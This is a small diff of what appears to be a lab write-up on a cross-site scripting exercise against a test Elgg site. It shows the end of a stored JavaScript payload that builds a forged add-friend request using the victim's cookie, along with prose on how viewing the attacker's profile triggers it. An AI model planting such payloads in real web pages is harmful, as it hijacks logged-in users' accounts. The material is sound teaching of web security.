@@ -93,7 +93,7 @@ Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/user11");
 Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 Ajax.send();
-</script>
+</script\>
 ```
 This code forms the GET request to duplicate the add friend action of the web app. When the victim say `alice` views the homepage of the attacker `user11`, her browser will read this code and execute the javascript inside the tags. Since the user `alice` is logged in while the code is executed, the attack will run smoothly and `user11` will be added to the friend list of `alice`.
 
